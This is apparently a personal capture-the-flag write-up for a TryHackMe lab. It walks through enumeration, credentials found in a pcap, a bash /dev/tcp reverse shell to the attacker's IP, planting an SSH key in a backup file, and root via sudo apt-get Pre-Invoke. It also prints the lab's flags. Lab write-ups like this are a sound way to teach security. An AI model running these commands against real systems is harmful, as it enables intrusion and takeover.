Link: https://tryhackme.com/room/smaggrotto
IP Address: 10.10.125.199
Date: June 22, 2025

Nmap Scan:
```┌──(kali㉿kali)-[~/Downloads/THM/smaggrotto]
└─$ nmap -sC -sV 10.10.125.199 -o nmapscan
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-22 17:52 +04
Nmap scan report for 10.10.125.199
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Smag
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
```
Webpage:
![](Pasted%20image%2020250622175402.png)
Directory enumeration:
```┌──(kali㉿kali)-[~/Downloads/THM/smaggrotto]
└─$ gobuster dir -u http://10.10.125.199/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.125.199/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 402]
/mail                 (Status: 301) [Size: 313] [--> http://10.10.125.199/mail/]
/server-status        (Status: 403) [Size: 278]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
/mail:
![](Pasted%20image%2020250622175702.png)

-> Downloaded pcap file and analyzing using Wireshark
-> Found login credentials helpdesk:cH4nG3M3_n0w 
![](Pasted%20image%2020250622175819.png)
-> Adding development.smag.thm to /etc/hosts

![](Pasted%20image%2020250622180237.png)

-> Using credentials found earlier
![](Pasted%20image%2020250622180345.png)

-> Obtained reverse shell using the command input field
```
bash -c 'exec bash -i &>/dev/tcp/10.8.35.149/4433 <&1'
```
```┌──(kali㉿kali)-[~/Downloads/THM/smaggrotto]
└─$ nc -lvnp 4433                         
listening on [any] 4433 ...
connect to [10.8.35.149] from (UNKNOWN) [10.10.125.199] 57874
bash: cannot set terminal process group (724): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smag:/var/www/development.smag.thm$ 
```

-> Trying to find useful binary files
```
www-data@smag:/$ find / -user root -perm /4000 2>/dev/null
find / -user root -perm /4000 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping6
/bin/ping
/bin/fusermount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

-> Transfer over linpeas.sh from attacker machine to target machine

![](Pasted%20image%2020250622181800.png)

-> This means I can try to create my own ssh key, add it to the backup, and gain access to ssh using jake's credentials

```┌──(kali㉿kali)-[~/Downloads/THM/smaggrotto]
└─$ ssh-keygen -t rsa -b 4096                     
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): jake
Enter passphrase for "jake" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in jake
Your public key has been saved in jake.pub
The key fingerprint is:
SHA256:4FmEqXfp/lDQTWnNP3AzlDEGKKFnfN8PJruQYBWQbqg kali@kali
The key's randomart image is:
+---[RSA 4096]----+
|       oo+o o=o=o|
|      o.+o =o.+=.|
|     ..+o=+o. o.o|
|    ..o+Bo. . ...|
|     oo+S . ..o..|
|    E  ..o . + ..|
|       .. o .   .|
|        .. . .   |
|         .. .    |
+----[SHA256]-----+
```
-> Add the pub contents to jake's backup
```
www-data@smag:/var/www/development.smag.thm$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDdorJaAUvlTdu7dESOtUA5A6DvKaKAc6C65MPrP0NEIoHgvD+zY50tgMiqPaRtH3ezkNLQNtZaakPQbyvh81VSEERNzeTCZpLza1qrio8vhlu0lRyAefBDQYDyiz6pNsUSpzXyNnbjAdFQkMBxEpQzVBNCClf+V2cj2viLd00Rk4blHmuZS1xjQa2I5qnIvepFbTZi4TNvpMfTulvvroHS/euKZJZryvWTTqxn3bzzRcX9Pn/wL031mc5dr6lZ2+NqLYzgTxhNr0Av3tJE5mt7o5NxYtgn3PcX7e42/WypR/jKCL0m9bD6JMgZu/qW5enfyl8Ff0knO8EJkqlZs3Gm1+iYqmPnSNr/ruVeFq1qEIGWitURZxO/EVwYPaoc85YJz1jVRAnW/y+/ujsC2QZKoleIB3c6FCctzTJh0MZ9W63etf+jxhZJyrU6VmqQWCJXTvP+CcOtOdNTJFxjEkl/mq5FfPfhbe28j+xk5h04FHJWK2+R2s67Os1cmJ3lnMXyGxQPD3rTm+/I0UVOZ6TuvB+rXVNrf8wcWDtHrWHifOnSJOlh/d6wanUYVazlMATFtXbs3mzsVYchD91YQKoL+1OoeVxB6OzUpROzVlbdZjp8+Ytp5+rxVkWMwQp195NqlgIVtxa0R7ehplVAL1KZiJwSu1TNHAuMa39aUP0Vvw== kali@kali" > /opt/.backups/jake_id_rsa.pub.backup
<u1TNHAuMa39aUP0Vvw== kali@kali" > /opt/.backups/jake_id_rsa.pub.backup 
```
-> We now have access to ssh
```┌──(kali㉿kali)-[~/Downloads/THM/smaggrotto]
└─$ ssh -i jake jake@10.10.125.199
The authenticity of host '10.10.125.199 (10.10.125.199)' can't be established.
ED25519 key fingerprint is SHA256:N0hcdtAhlytMwu8PGLVD+c0ZKcV7TMNWnOr0wVw0Wp8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.125.199' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ 

```

-> user.txt
```
jake@smag:~$ cat user.txt 
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```
-> Finding sudo files to privilege escalate
```
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get

```

-> gtfo.bins
![](Pasted%20image%2020250622184037.png)

-> Thus, we were able to elevate privleges to root and get the final root.txt flag
```
jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami
root
# cat /root/root.txt
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```
